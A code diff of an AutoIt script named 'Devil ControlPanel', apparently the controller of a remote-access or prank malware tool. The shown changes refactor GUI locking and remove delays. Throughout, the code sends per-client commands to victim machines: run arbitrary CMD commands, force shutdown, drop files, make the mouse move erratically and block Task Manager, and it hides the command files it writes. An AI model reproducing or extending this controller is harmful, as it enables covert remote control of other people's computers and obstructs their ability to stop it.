@@ -2,7 +2,7 @@
 
  Devil ControlPanel
  AutoIt Version: 3.3.14.5
- Version: Release ( 22:40 5.18.2018 )
+ Version: Release ( 22:35 25.11.2018 )
 
 #ce ----------------------------------------------------------------------------
 
@@ -67,44 +67,32 @@ GUISetState(@SW_SHOW)
 
 ; Main Loop
 While True
-    Sleep(10)
+    Sleep(5)
 	$GUICommand = GUIGetMsg()
+
+	LockGUI()
 	Switch $GUICommand
 		Case $GUI_EVENT_CLOSE
 			Terminate()
         Case $ShowMessageBox_Button
-            LockGUI()
             ShowMessageBox()
-            UnlockGUI()
         Case $ExecuteToCMD_Button
-            LockGUI()
             ExecuteToCMD()
-            UnlockGUI()
         Case $SystemShutdown_Button
-            LockGUI()
             SystemShutdown()
-            UnlockGUI()
         Case $LoadFile_Button
-            LockGUI()
             LoadFile()
-            UnlockGUI()
         Case $CrazyMouse_EnableButton
-            LockGUI()
             EnableCrazyMouse()
-            UnlockGUI()
         Case $CrazyMouse_DisableButton
-            LockGUI()
             DisableCrazyMouse()
-            UnlockGUI()
         Case $BlockTaskManager_EnableButton
-            LockGUI()
             EnableBlockTaskManager()
-            UnlockGUI()
         Case $BlockTaskManager_DisableButton
-            LockGUI()
             DisableBlockTaskManager()
-            UnlockGUI()
 	EndSwitch
+	UnlockGUI()
+
 WEnd
 
 ; ------------------------------------------------------------------------------
@@ -112,6 +100,7 @@ WEnd
 ; Show message box
 Func ShowMessageBox()
     $ClientID = GUICtrlRead($InputBox)
+
     If $ClientID = "" Then
         MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
     Else
@@ -126,14 +115,15 @@ Func ShowMessageBox()
             FileDelete($Server_Directory & "\" & $ClientID & "_temp")
             FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
             FileClose($Temp_DataFile)
-            Sleep(1000)
         EndIf
     EndIf
+
 EndFunc
 
 ; Execute CMD command
 Func ExecuteToCMD()
     $ClientID = GUICtrlRead($InputBox)
+
     If $ClientID = "" Then
         MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
     Else
@@ -148,14 +138,15 @@ Func ExecuteToCMD()
             FileDelete($Server_Directory & "\" & $ClientID & "_temp")
             FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
             FileClose($Temp_DataFile)
-            Sleep(1000) 
         EndIf
     EndIf
+
 EndFunc
 
 ; Shutdown system
 Func SystemShutdown()
     $ClientID = GUICtrlRead($InputBox)
+
     If $ClientID = "" Then
         MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
     Else
@@ -168,13 +159,14 @@ Func SystemShutdown()
         FileDelete($Server_Directory & "\" & $ClientID & "_temp")
         FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
         FileClose($Temp_DataFile)
-        Sleep(1000) 
     EndIf
+
 EndFunc
 
 ; Load file to the system
 Func LoadFile()
     $ClientID = GUICtrlRead($InputBox)
+
     If $ClientID = "" Then
         MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
     Else
@@ -191,14 +183,15 @@ Func LoadFile()
             FileDelete($Server_Directory & "\" & $ClientID & "_temp")
             FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
             FileClose($Temp_DataFile)
-            Sleep(1000)
         EndIf
     EndIf
+
 EndFunc
 
 ; Enable CrazyMouse
 Func EnableCrazyMouse()
     $ClientID = GUICtrlRead($InputBox)
+
     If $ClientID = "" Then
         MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
     Else
@@ -211,13 +204,14 @@ Func EnableCrazyMouse()
         FileDelete($Server_Directory & "\" & $ClientID & "_temp")
         FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
         FileClose($Temp_DataFile)
-        Sleep(500) 
     EndIf
+
 EndFunc
 
 ; Disable CrazyMouse
 Func DisableCrazyMouse()
     $ClientID = GUICtrlRead($InputBox)
+
     If $ClientID = "" Then
         MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
     Else
@@ -230,13 +224,14 @@ Func DisableCrazyMouse()
         FileDelete($Server_Directory & "\" & $ClientID & "_temp")
         FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
         FileClose($Temp_DataFile)
-        Sleep(500) 
     EndIf
+
 EndFunc
 
 ; Enable block task manager
 Func EnableBlockTaskManager()
     $ClientID = GUICtrlRead($InputBox)
+
     If $ClientID = "" Then
         MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
     Else
@@ -249,13 +244,14 @@ Func EnableBlockTaskManager()
         FileDelete($Server_Directory & "\" & $ClientID & "_temp")
         FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
         FileClose($Temp_DataFile)
-        Sleep(500) 
     EndIf
+
 EndFunc
 
 ; Disable block task manager
 Func DisableBlockTaskManager()
     $ClientID = GUICtrlRead($InputBox)
+
     If $ClientID = "" Then
         MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
     Else
@@ -268,8 +264,8 @@ Func DisableBlockTaskManager()
         FileDelete($Server_Directory & "\" & $ClientID & "_temp")
         FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
         FileClose($Temp_DataFile)
-        Sleep(500) 
     EndIf
+	
 EndFunc
 
 ; Lock gui elements
